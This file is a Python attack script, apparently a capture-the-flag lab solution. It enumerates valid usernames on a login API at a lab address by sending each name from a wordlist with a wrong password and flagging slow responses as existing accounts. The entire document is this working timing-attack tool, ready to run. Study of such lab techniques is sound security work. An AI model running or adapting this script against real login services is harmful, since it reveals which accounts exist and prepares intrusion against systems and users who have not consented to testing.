import requests
import time

# Wordlist filename
USERS_WORDLIST = "names.txt" 

#Room's URL
URL = "http://10.10.30.217/api/user/login"

#Time threshold
VALID_USER_TIME = 0.7

#Main function
def main():
	print("Starting...")
	#Call function to read the lines of the file
	lines = read_file(USERS_WORDLIST)

	users_found = []

	#Read line by line
	for line in lines:
		user = line.rstrip('\n')
		response_time = try_to_login(user)
		
		if (check_response(response_time)):
			print("User found: " + user)
			users_found.append(user)

	print("Users found:")
	print(users_found)

#Log time and try to login
def try_to_login(user):
	creds = {"username": user, "password": "invalidPassword!"}

	start_time = time.time()
	response = requests.post(URL, json=creds)
	end_time = time.time()
	time.sleep(0.01)

	return end_time - start_time

#Check if the response time corresponds to a valid user
def check_response(response_time):
	return response_time > VALID_USER_TIME

#Read the lines of a file (the wordlist)
def read_file(path):
	with open(path, encoding="utf-8", errors="ignore") as reader:
		return reader.readlines()


if __name__ == "__main__":
	main()